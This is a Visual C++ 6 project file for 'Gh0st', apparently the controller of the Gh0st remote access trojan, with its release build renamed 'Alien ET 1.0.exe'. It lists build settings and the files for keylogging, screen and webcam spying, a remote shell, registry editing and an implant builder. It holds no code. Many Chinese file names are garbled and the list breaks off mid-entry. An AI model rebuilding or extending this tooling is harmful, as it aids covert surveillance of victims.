# Microsoft Developer Studio Project File - Name="Gh0st" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Gh0st - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Gh0st.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Gh0st.mak" CFG="Gh0st - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Gh0st - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "Gh0st - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "Gh0st - Win32 Release"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /GX /Zi /O2 /I "Include" /I "..\common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /Fr /FD /Zm1000 /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ..\common\libxvidcore.lib ..\common\va_g729a.lib vfw32.lib nafxcw.lib LIBCMT.lib /nologo /subsystem:windows /debug /machine:I386 /out:"../BIN/Alien ET 1.0.exe"

!ELSEIF  "$(CFG)" == "Gh0st - Win32 Debug"

# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MDd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /I "Include" /I "../common" /I "../common/xvidcore-1.0.3/src" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /FR /FD /GZ /Zm1000 /c
# SUBTRACT CPP /YX
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG" /d "_AFXDLL"
# ADD RSC /l 0x409 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 ..\common\libxvidcore.lib ..\common\va_g729a.lib vfw32.lib nafxcwd.lib libcmtd.lib /nologo /subsystem:windows /debug /machine:I386 /nodefaultlib:"libc.lib" /out:"..\Bin\Gh0st.exe" /pdbtype:sept

!ENDIF 

# Begin Target

# Name "Gh0st - Win32 Release"
# Name "Gh0st - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Base64a.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\Build.cpp
# End Source File
# Begin Source File

SOURCE=.\BulidServer.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\CRC.cpp
# End Source File
# Begin Source File

SOURCE=.\Curvefit.cpp
# End Source File
# Begin Source File

SOURCE=.\DataStatus.cpp
# End Source File
# Begin Source File

SOURCE=.\Dib.cpp
# End Source File
# Begin Source File

SOURCE=.\Digistatic.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Gh0st.cpp
# End Source File
# Begin Source File

SOURCE=.\Gh0st.rc
# End Source File
# Begin Source File

SOURCE=.\Gh0stDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\Gh0stView.cpp
# End Source File
# Begin Source File

SOURCE=.\Icons.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.cpp
# End Source File
# Begin Source File

SOURCE=.\LOGIN.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MD5.CPP
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Mydat.cpp
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.cpp
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.cpp
# End Source File
# Begin Source File

SOURCE=.\PcView.cpp
# End Source File
# Begin Source File

SOURCE=.\PictureEx.cpp
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SelectQQ.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SetColor.cpp
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\ShowWave.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\XInfoTip.cpp
# End Source File
# Begin Source File

SOURCE=.\XSLEEP.CPP
# End Source File
# Begin Source File

SOURCE=.\Include\XvidDec.cpp
# End Source File
# Begin Source File

SOURCE=.\zip.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\Base64a.h
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\Build.h
# End Source File
# Begin Source File

SOURCE=.\BulidServer.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.h
# End Source File
# Begin Source File

SOURCE=.\CRC.h
# End Source File
# Begin Source File

SOURCE=.\Curvefit.h
# End Source File
# Begin Source File

SOURCE=.\DataStatus.h
# End Source File
# Begin Source File

SOURCE=.\decode.h
# End Source File
# Begin Source File

SOURCE=.\Dib.h
# End Source File
# Begin Source File

SOURCE=.\Digistatic.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\Gh0st.h
# End Source File
# Begin Source File

SOURCE=.\Gh0stDoc.h
# End Source File
# Begin Source File

SOURCE=.\Gh0stView.h
# End Source File
# Begin Source File

SOURCE=.\Icons.h
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.h
# End Source File
# Begin Source File

SOURCE=.\LOGIN.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\Include\Mapper.h
# End Source File
# Begin Source File

SOURCE=.\MD5.h
# End Source File
# Begin Source File

SOURCE=..\common\minilzo.h
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.h
# End Source File
# Begin Source File

SOURCE=.\Mydat.h
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.h
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.h
# End Source File
# Begin Source File

SOURCE=.\PcView.h
# End Source File
# Begin Source File

SOURCE=.\PictureEx.h
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.h
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\SelectQQ.h
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.h
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.h
# End Source File
# Begin Source File

SOURCE=.\SetColor.h
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\showwave.h
# End Source File
# Begin Source File

SOURCE=.\SkinH.h
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.h
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=.\XInfoTip.h
# End Source File
# Begin Source File

SOURCE=.\XSLEEP.H
# End Source File
# Begin Source File

SOURCE=.\Include\XvidDec.h
# End Source File
# Begin Source File

SOURCE=.\zip.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=.\res\102.ico
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\Reg\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\254.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\255.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\256.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\257.ico
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\aaaa.gif"
# End Source File
# Begin Source File

SOURCE=.\res\AppWindows.ico
# End Source File
# Begin Source File

SOURCE=.\res\Audio.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\baoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\baoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\baoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\baoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\baoyuzhuandabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\baoyuzhuandabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\Becareful.ico
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bmp194.bmp
# End Source File
# Begin Source File

SOURCE=.\res\cam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Cmdshell.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\dabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\dabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\dabaoyuzhuantedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\dabaoyuzhuantedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\daxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\daxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\daxuezhuanbaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\daxuezhuanbaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\dayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\dayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\dayuzhuanbaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\dayuzhuanbaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\dongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\dongyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\duoyun.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\duoyun.ico"
# End Source File
# Begin Source File

SOURCE=.\res\event.ico
# End Source File
# Begin Source File

SOURCE=.\res\EventError.ico
# End Source File
# Begin Source File

SOURCE=.\res\File.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\fuchen.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\fuchen.ico"
# End Source File
# Begin Source File

SOURCE=.\res\Gh0st.ico
# End Source File
# Begin Source File

SOURCE=.\res\Gh0st.rc2
# End Source File
# Begin Source File

SOURCE=.\res\Gh0stDoc.ico
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\ico00001.ico
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\leizhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\leizhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\leizhenyubanyoubingbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\leizhenyubanyoubingbao.ico"
# End Source File
# Begin Source File

SOURCE=.\res\Load1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Load2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Load3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Load4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Load5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\logo.png.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\mai.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\mai.ico"
# End Source File
# Begin Source File

SOURCE=.\res\MenuBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\nocam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Process.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\qiangshachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\qiangshachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\qing.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\qing.ico"
# End Source File
# Begin Source File

SOURCE=.\res\regedit.ico
# End Source File
# Begin Source File

SOURCE=.\res\ScreenSpy.ico
# End Source File
# Begin Source File

SOURCE=.\res\SearchToolBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Service.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\shachenbao.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\shachenbao.ico"
# End Source File
# Begin Source File

SOURCE=.\res\System.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\tedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\tedabaoyu.ico"
# End Source File
# Begin Source File

SOURCE=.\res\toolbar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\WebCam.ico
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\wu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\wu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\xiaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\xiaoxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\xiaoxuezhuanzhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\xiaoxuezhuanzhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\xiaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\xiaoyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\xiaoyuzhuanzhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\xiaoyuzhuanzhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\yangsha.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\yangsha.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\yin.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\yin.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\yujiaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\yujiaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhenxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\zhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhenyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\zhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhongxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\zhongxuezhuandaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhongxuezhuandaxue.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\zhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhongyu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\day\zhongyuzhuandayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\�ٶ������ӿ�ͼ��\night\zhongyuzhuandayu.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����͢.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ݽ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ɳ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ϺͰͲ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�µ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ĵ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ͰͶ�˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ͳ����¼�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�͹���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ͻ�˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�׶���˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������Լ��֯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ʱ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��˹���Ǻͺ�����ά��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ɷ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��¡��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\��������.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�¹�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ǹ���Э��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������ҹ�Э.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��϶��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ɱ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ý�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\��������.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ա���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�չ�(��).ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�չ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ױ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��˹�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����ɴ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��³����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\��������.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�Ű�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\������ͼ��\���ڳ���.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Э.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�鶼��˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����Ǳ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ձȺ���ͬ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ô�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
